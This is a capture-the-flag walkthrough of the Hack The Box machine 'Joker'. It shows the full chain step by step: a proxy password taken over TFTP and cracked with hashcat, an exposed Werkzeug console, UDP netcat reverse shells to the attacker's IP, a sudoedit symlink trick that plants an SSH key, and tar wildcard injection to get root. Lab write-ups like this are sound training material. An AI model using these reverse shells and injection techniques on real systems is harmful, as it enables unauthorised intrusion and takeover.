nmap scan

```bash
$ sudo nmap -sV -sC 10.10.10.21
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br/>

Let's start by enumerating port 3128

![joker1](/images/htb-joker/joker1.png)

Nmap said it's a proxy so I'm going to add it with foxy proxy

![joker2](/images/htb-joker/joker2.png)

Now trying to go to the ip it hangs so probably a username and password is needed, and with these 2 ports there's nothing to do, so let's do a UDP scan

```bash
$ sudo nmap -sU 10.10.10.21
PORT     STATE         SERVICE
69/udp   open|filtered tftp
5355/udp open|filtered llmnr
```

<br/>

Now, enumerate port 69 that is tftp, now I searched for different files, but I need a password so let's search for the squid config file

```bash
tftp> get /etc/squid/squid.conf
```

Ths file has a lot of content so i'm going to grep for password

```bash
$ cat squid.conf | grep  "password"
#               their username and password.
#               password verifications are done via a (slow) network you are
#         password=     The users password (for login= cache_peer option)
#         # to check username/password combinations (see
#               acl password proxy_auth REQUIRED
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
#  TAG: sslpassword_program
#       selection of the right password if you have multiple encrypted
#       login=user:password
#                       to pass on, but username and password are available
#                       from an external ACL user= and password= result tags
#                       password to the peer. USE WITH CAUTION
#       login=*:password
#                       fixed password. This is meant to be used when the peer
#                       the login=username:password option above.
#                       it is the password; for Digest, the realm sent by the
#       If you want the anonymous login password to be more informative
#       (taken from the password file) and supplementary group list
#       "password=<password>" to the end of this service declaration.
#       wccp2_service standard 0 password=foo
#       Specify passwords for cachemgr operations.
#       Usage: cachemgr_passwd password action action ...
#         valid password, others can be performed if not listed here.
#       To disable an action, set the password to "disable".
#       To allow performing an action without a password, set the
#       password to "none".
#       Use the keyword "all" to set the same password for all actions.
# No password. Actions which require password are denied.
```

Now let's get the /etc/squid/passwords file

```bash
tftp> get /etc/squid/passwords
```

```bash
$ cat passwords 
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
```

And now crack it, i'm using hashcat in my windows host

```
hashcat.exe -m 1600 hash.txt rockyou.txt
```

And the cracked password is ihateseafood, we have credentials so let's add it to the proxy

![joker3](/images/htb-joker/joker3.png)

And go to http://10.10.10.21

![joker4](/images/htb-joker/joker4.png)

Nothing, so now check 127.0.0.1

![joker5](/images/htb-joker/joker5.png)

Let's use gobuster

```bash
$ sudo gobuster -w /opt/wordlists/directory-list-2.3-medium.txt -u http://127.0.0.1 -p http://kalamari:ihateseafood@10.10.10.21:3128 -t 50
/list (Status: 301)
/console (Status: 200)
```

Now let's check /console

![joker6](/images/htb-joker/joker6.png)

It's a interactive python2 console, i'm going to see some information about the OS

```python
>>> import os
>>> import sys
>>> sys.version
'2.7.12+ (default, Sep 17 2016, 12:08:02) \n[GCC 6.2.0 20160914]'
>>> os.getlogin()
'werkzeug'
```

And nc it's installed

```python
>>> os.popen("nc -h 2>&1").read()
'OpenBSD netcat (Debian patchlevel 1.105-7ubuntu1)\nThis is nc from the netcat-openbsd package.
```

So the way to continue is get a reverse shell, but first I'm going to ping me back

```python
>>> os.popen("ping -c 2 10.10.14.19 &").read()
```

The & at the end is for not hang the box is the process dies, I learned this from ippsec video, good thing to learn in a real life scenario to not crash a computer.

```bash
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
11:22:41.798133 IP 10.10.10.21 > ubuntu: ICMP echo request, id 1567, seq 1, length 64
11:22:41.798149 IP ubuntu > 10.10.10.21: ICMP echo reply, id 1567, seq 1, length 64
11:22:42.810554 IP 10.10.10.21 > ubuntu: ICMP echo request, id 1567, seq 2, length 64
11:22:42.810563 IP ubuntu > 10.10.10.21: ICMP echo reply, id 1567, seq 2, length 64
```

So we can ping us back, I tried common methods to get a reverse shell but none worked, so i checked iptables

```python
>>> with open('/etc/iptables/rules.v4', 'r') as f: print(f.read())
# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017
```

A UDP reverse shell is possible

```python
>>> os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.19 9001 >/tmp/f &").read()
```

I used this common nc reverse shell but I added -u for udp

```bash
$ nc -u -lvnp 9001
Bound on 0.0.0.0 9001
Connection received on 10.10.10.21 53369
/bin/sh: 0: can't access tty; job control turned off
$
```

<br/>

Now from low privileges shell to user

```bash
$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
```

I'll use this sudoedit vulnerability, searchsploit -x linux/local/37710.txt

```bash
werkzeug@joker:~/testing$ mkdir priv
werkzeug@joker:~/testing$ cd priv/
$ ln -s /home/alekos/.ssh/authorized_keys layout.html
$ sudoedit -u alekos /var/www/testing/priv/layout.html
```

And nano opens, now generate ssh keys and paste it there

```bash
$ ssh-keygen -f jokerkey
$ cat jokerkey.pub 
ssh-rsa AAAAB3Nz.............................
```

Paste it there

```bash
sudoedit -u alekos /var/www/testing/priv/layout.html
```

And make a ssh connection

```bash
$ chmod 600 jokerkey
$ ssh -i jokerkey alekos@10.10.10.21
```

<br/>

Now from user to root

```bash
$ ls
backup  development  user.txt
```

In backup there are a lot of .tar.gz files, let's decompress one to see what's there

```bash
$ mkdir temp
$ cd temp
$ tar -xvf ../dev-1600112101.tar.gz
__init__.py
application.py
data/
data/shorty.db
models.py
static/
static/style.css
templates/
templates/layout.html
templates/not_found.html
templates/list.html
templates/display.html
templates/new.html
utils.py
views.py
$ ls
application.py  data  __init__.py  models.py  static  templates  utils.py  views.py
```

This is backing up what's on development every 5 minutes, there's a way to execute commands with tar and --, if you create a file like this:

```bash
$ touch -- -la
```

And do

```bash
$ ls *                                                      
total 36                                                                                                                                             
drwxr-x--- 5 alekos alekos 4096 Sep 14 23:19 .                                                                                                       
drwxr-xr-x 7 alekos alekos 4096 Sep 14 23:19 ..                                                                                                      
-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py                                                                                          
drwxrwx--- 2 alekos alekos 4096 May 18  2017 data                                                                                                    
-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py
-rw-rw-r-- 1 alekos alekos    0 Sep 14 23:19 -la
-rw-r----- 1 alekos alekos  997 May 18  2017 models.py
drwxr-x--- 2 alekos alekos 4096 May 18  2017 static
drwxr-x--- 2 alekos alekos 4096 May 18  2017 templates
-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py
-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py
alekos@joker:~/development$ ls *
-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py
-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py
-rw-r----- 1 alekos alekos  997 May 18  2017 models.py
-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py
-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py

data:
total 20
drwxrwx--- 2 alekos alekos  4096 May 18  2017 .
drwxr-x--- 5 alekos alekos  4096 Sep 14 23:19 ..
-rw-r--r-- 1 alekos alekos 12288 May 18  2017 shorty.db

static:
total 12
drwxr-x--- 2 alekos alekos 4096 May 18  2017 .
drwxr-x--- 5 alekos alekos 4096 Sep 14 23:19 ..
-rw-r----- 1 alekos alekos 1585 May 18  2017 style.css

templates:
total 28
drwxr-x--- 2 alekos alekos 4096 May 18  2017 .
drwxr-x--- 5 alekos alekos 4096 Sep 14 23:19 ..
rw-r----- 1 alekos alekos  193 May 18  2017 display.html
-rw-r----- 1 alekos alekos  524 May 18  2017 layout.html
-rw-r----- 1 alekos alekos  725 May 18  2017 list.html
-rw-r----- 1 alekos alekos  624 May 18  2017 new.html
-rw-r----- 1 alekos alekos  231 May 18  2017 not_found.html
```

The -la is passed as an argument, so let's use this to get code execution with tar and --checkpoint

```bash
$ touch -- --checkpoint=1
$ touch -- '--checkpoint-action=exec=sh shell.sh'
```

Create the shell.sh

```bash
#!/bin/bash

rm /tmp/i
mkfifo /tmp/i
cat /tmp/i|/bin/sh -i 2>&1|nc -u 10.10.14.19 9002 >/tmp/i
```

And after some minutes

```bash
$ nc -u -lvnp 9002
Listening on 0.0.0.0 9002
# id
uid=0(root) gid=0(root) groups=0(root)
```
